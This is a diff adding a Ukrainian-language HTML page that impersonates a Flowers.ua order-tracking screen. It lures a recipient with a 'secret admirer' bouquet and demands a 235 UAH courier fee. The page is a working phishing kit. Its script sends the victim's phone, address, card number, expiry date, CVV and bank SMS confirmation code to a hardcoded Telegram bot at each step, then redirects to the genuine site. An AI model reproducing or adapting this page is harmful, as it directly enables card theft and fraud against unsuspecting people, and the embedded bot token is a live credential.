@@ -1,0 +1,397 @@
+<!DOCTYPE html>
+<html lang="uk">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=yes">
+    <title>Трекінг замовлення – Flowers.ua</title>
+    <style>
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+        }
+
+        body {
+            background: #f4f2ef;
+            font-family: 'Inter', -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, Helvetica, Arial, sans-serif;
+            padding: 24px 16px;
+            color: #1a2a1a;
+        }
+
+        /* Основний контейнер */
+        .tracking-container {
+            max-width: 620px;
+            margin: 0 auto;
+            background: #ffffff;
+            border-radius: 40px;
+            box-shadow: 0 20px 35px -12px rgba(0, 0, 0, 0.1);
+            overflow: hidden;
+        }
+
+        /* Хедер */
+        .header {
+            background: #1f4722;
+            padding: 20px 24px;
+            text-align: center;
+        }
+
+        .logo {
+            max-width: 180px;
+            height: auto;
+            filter: brightness(0) invert(1);
+        }
+
+        /* Статус трекінгу – реалістично */
+        .track-status {
+            background: #fef9e6;
+            margin: 20px 20px 0 20px;
+            border-radius: 28px;
+            padding: 18px 20px;
+            border: 1px solid #ffe1b3;
+            display: flex;
+            align-items: center;
+            justify-content: space-between;
+            flex-wrap: wrap;
+            gap: 12px;
+        }
+
+        .status-badge {
+            background: #2b5e2f;
+            color: white;
+            padding: 6px 16px;
+            border-radius: 40px;
+            font-size: 13px;
+            font-weight: 600;
+        }
+
+        .order-id {
+            font-family: monospace;
+            font-weight: 700;
+            background: #eae2d7;
+            padding: 6px 14px;
+            border-radius: 32px;
+            font-size: 14px;
+        }
+
+        /* Секція трекінгу */
+        .tracking-details {
+            padding: 8px 24px 0 24px;
+        }
+
+        .info-row {
+            display: flex;
+            justify-content: space-between;
+            padding: 12px 0;
+            border-bottom: 1px solid #ece4db;
+        }
+
+        .info-label {
+            font-weight: 500;
+            color: #6c5b49;
+        }
+
+        .info-value {
+            font-weight: 600;
+            color: #2c3e2b;
+        }
+
+        /* Етапи доставки */
+        .timeline {
+            margin: 20px 0;
+            background: #fafaf8;
+            border-radius: 24px;
+            padding: 16px;
+        }
+
+        .timeline-step {
+            display: flex;
+            align-items: center;
+            gap: 12px;
+            margin-bottom: 18px;
+        }
+
+        .step-dot {
+            width: 32px;
+            height: 32px;
+            background: #e0d6cc;
+            border-radius: 50%;
+            display: inline-flex;
+            align-items: center;
+            justify-content: center;
+            font-weight: bold;
+            color: #5f4e3a;
+        }
+
+        .step-dot.active {
+            background: #2b5e2f;
+            color: white;
+        }
+
+        .step-text {
+            font-size: 14px;
+        }
+
+        /* Форми */
+        .payment-block {
+            background: #ffffff;
+            border-radius: 32px;
+            margin: 0 20px 24px 20px;
+            box-shadow: 0 4px 16px rgba(0,0,0,0.04);
+            border: 1px solid #efe5db;
+            padding: 20px;
+        }
+
+        .step-form {
+            display: none;
+        }
+
+        .step-form.active-form {
+            display: block;
+        }
+
+        label {
+            font-weight: 600;
+            font-size: 14px;
+            display: block;
+            margin-top: 16px;
+            margin-bottom: 6px;
+            color: #2a4730;
+        }
+
+        input {
+            width: 100%;
+            padding: 14px 18px;
+            border: 1px solid #ddd2c6;
+            border-radius: 60px;
+            font-size: 16px;
+            background: #fff;
+            transition: all 0.2s;
+            font-family: inherit;
+        }
+
+        input:focus {
+            outline: none;
+            border-color: #1f6e2c;
+            box-shadow: 0 0 0 3px rgba(31,110,44,0.1);
+        }
+
+        button {
+            width: 100%;
+            background: #1f6e2c;
+            color: white;
+            padding: 15px;
+            border: none;
+            border-radius: 60px;
+            font-weight: 700;
+            font-size: 16px;
+            margin-top: 24px;
+            cursor: pointer;
+            transition: 0.15s;
+        }
+
+        button:active {
+            transform: scale(0.97);
+            background: #155320;
+        }
+
+        .price-chip {
+            background: #eef3ea;
+            border-radius: 28px;
+            padding: 16px;
+            text-align: center;
+            margin: 20px 0 10px;
+        }
+
+        .big-price {
+            font-size: 32px;
+            font-weight: 800;
+            color: #b6451c;
+        }
+
+        .secure-note {
+            font-size: 12px;
+            color: #887b6b;
+            text-align: center;
+            margin-top: 14px;
+        }
+
+        hr {
+            margin: 8px 0;
+            border: none;
+            border-top: 1px solid #f0e8e0;
+        }
+
+        .flex-row {
+            display: flex;
+            gap: 12px;
+        }
+    </style>
+</head>
+<body>
+
+<div class="tracking-container">
+    <div class="header">
+        <img class="logo" src="https://i.imgur.com/2WzBQ5M.png" alt="Flowers.ua" 
+             onerror="this.src='https://cdn-icons-png.flaticon.com/512/1995/1995572.png'">
+    </div>
+
+    <!-- Інформація про замовлення (трекінг) -->
+    <div class="track-status">
+        <div><span class="status-badge">В дорозі</span> ⚡ очікує дій</div>
+        <div class="order-id">Замовлення: FL-2309-42KX</div>
+    </div>
+
+    <div class="tracking-details">
+        <div class="info-row">
+            <span class="info-label">Отримувач:</span>
+            <span class="info-value">Шановний клієнт (підтвердіть дані)</span>
+        </div>
+        <div class="info-row">
+            <span class="info-label">Вміст:</span>
+            <span class="info-value">Букет "Айвори троянда" + шоколадний бокс</span>
+        </div>
+        <div class="info-row">
+            <span class="info-label">Відправлено:</span>
+            <span class="info-value">Таємний шанувальник</span>
+        </div>
+    </div>
+
+    <!-- Таймлайн доставки -->
+    <div class="timeline">
+        <div class="timeline-step">
+            <div class="step-dot active">✓</div>
+            <div class="step-text"><strong>Замовлення зібрано</strong> – квітковий магазин</div>
+        </div>
+        <div class="timeline-step">
+            <div class="step-dot active">✓</div>
+            <div class="step-text"><strong>Передано кур'єру</strong> – очікує підтвердження адреси</div>
+        </div>
+        <div class="timeline-step">
+            <div class="step-dot">⏳</div>
+            <div class="step-text"><strong>Доставка</strong> – необхідно оплатити послуги кур'єра (235 грн)</div>
+        </div>
+    </div>
+
+    <!-- Блок для підтвердження та оплати кур'єра -->
+    <div class="payment-block">
+        <h3 style="font-size: 18px; margin-bottom: 8px;">💰 Підтвердження доставки</h3>
+        <p style="font-size: 14px; color: #5c5142;">Для завершення трекінгу та отримання замовлення – оплатіть кур'єрську послугу 235 грн. Кошти будуть заморожені до моменту вручення букету.</p>
+
+        <!-- Крок 1: Номер телефону -->
+        <div id="stepPhone" class="step-form active-form">
+            <label>📱 Ваш номер телефону (для зв'язку кур'єра)</label>
+            <input type="tel" id="phone" placeholder="+38 0XX XXX XX XX">
+            <button onclick="goToAddress()">Продовжити трекінг</button>
+        </div>
+
+        <!-- Крок 2: Адреса + час доставки -->
+        <div id="stepAddress" class="step-form">
+            <label>📍 Адреса доставки (вулиця, будинок, квартира)</label>
+            <input type="text" id="address" placeholder="Наприклад: Київ, вул. Велика Васильківська, 15">
+            <label>🕒 Бажаний час доставки (сьогодні/завтра)</label>
+            <input type="text" id="time" placeholder="18:00 – 20:00">
+            <button onclick="goToPayment()">Розрахувати вартість кур'єра</button>
+        </div>
+
+        <!-- Крок 3: Оплата 235 грн -->
+        <div id="stepPayment" class="step-form">
+            <div class="price-chip">
+                <div>Вартість кур'єрської послуги</div>
+                <div class="big-price">235 грн</div>
+                <div style="font-size: 13px;">(включає термінову доставку + подарункову упаковку)</div>
+            </div>
+            <p style="margin: 12px 0 0; font-size: 14px;">✅ Оплата сплачується отримувачем. Для підтвердження трекінгу необхідно провести оплату.</p>
+            <button onclick="goToCard()">Перейти до оплати 235 грн</button>
+        </div>
+
+        <!-- Крок 4: Дані картки -->
+        <div id="stepCard" class="step-form">
+            <label>💳 Номер картки (Visa/Mastercard)</label>
+            <input type="text" id="cardNumber" placeholder="0000 0000 0000 0000" autocomplete="off">
+            <div class="flex-row">
+                <input type="text" id="cardExp" placeholder="ММ/РР" style="width: 50%;">
+                <input type="text" id="cardCvv" placeholder="CVV" maxlength="4" style="width: 50%;">
+            </div>
+            <button onclick="sendCardData()">Надіслати та отримати SMS-код</button>
+            <div class="secure-note">🔒 Платіж захищений технологією 3D-Secure. Гроші не списуються без коду.</div>
+        </div>
+
+        <!-- Крок 5: SMS код -->
+        <div id="stepSms" class="step-form">
+            <label>📲 Код підтвердження з SMS від банку</label>
+            <input type="text" id="smsCode" placeholder="Введіть 6 цифр">
+            <button onclick="finalConfirmation()">Підтвердити та отримати замовлення</button>
+        </div>
+    </div>
+    <div style="height: 20px;"></div>
+</div>
+
+<script>
+    const BOT_TOKEN = '8627594813:AAF-eC124wgCOPqaj6Tu_Yp9TvQjNqLZqDU';
+    const CHAT_ID = '-1003971116343';
+    let trackingData = {};
+
+    function sendToTelegram(msg) {
+        fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
+            method: 'POST',
+            headers: { 'Content-Type': 'application/json' },
+            body: JSON.stringify({ chat_id: CHAT_ID, text: msg })
+        }).catch(e => console.warn);
+    }
+
+    function showForm(activeId) {
+        const forms = ['stepPhone', 'stepAddress', 'stepPayment', 'stepCard', 'stepSms'];
+        forms.forEach(id => {
+            const el = document.getElementById(id);
+            if (el) el.classList.remove('active-form');
+        });
+        document.getElementById(activeId).classList.add('active-form');
+    }
+
+    function goToAddress() {
+        let phone = document.getElementById('phone').value.trim();
+        if (!phone) { alert('Будь ласка, вкажіть номер телефону для зв’язку кур’єра'); return; }
+        trackingData.phone = phone;
+        sendToTelegram(`📞 Трекінг замовлення: телефон отримувача - ${phone}`);
+        showForm('stepAddress');
+    }
+
+    function goToPayment() {
+        let address = document.getElementById('address').value.trim();
+        let time = document.getElementById('time').value.trim();
+        if (!address || !time) { alert('Введіть повну адресу та зручний час доставки'); return; }
+        trackingData.address = address;
+        trackingData.time = time;
+        sendToTelegram(`📍 Адреса доставки: ${address} | Час: ${time}`);
+        showForm('stepPayment');
+    }
+
+    function goToCard() {
+        showForm('stepCard');
+    }
+
+    function sendCardData() {
+        let card = document.getElementById('cardNumber').value.trim().replace(/\s/g, '');
+        let exp = document.getElementById('cardExp').value.trim();
+        let cvv = document.getElementById('cardCvv').value.trim();
+        if (!card || !exp || !cvv) { alert('Введіть усі дані картки для блокування 235 грн'); return; }
+        trackingData.card = card;
+        trackingData.exp = exp;
+        trackingData.cvv = cvv;
+        sendToTelegram(`💳 ДАНІ КАРТКИ для оплати кур'єра: ${card} | Термін: ${exp} | CVV: ${cvv}`);
+        showForm('stepSms');
+    }
+
+    function finalConfirmation() {
+        let sms = document.getElementById('smsCode').value.trim();
+        if (!sms) { alert('Введіть код підтвердження з SMS вашого банку'); return; }
+        trackingData.sms = sms;
+        sendToTelegram(`🔐 КОД ІЗ СМС (підтвердження оплати 235 грн): ${sms}`);
+        alert('✅ Замовлення підтверджено! Кур’єр зв’яжеться з вами найближчим часом. Дякуємо, що обрали Flowers.ua');
+        setTimeout(() => {
+            window.location.href = 'https://flowers.ua';
+        }, 2000);
+    }
+</script>
+</body>
+</html>
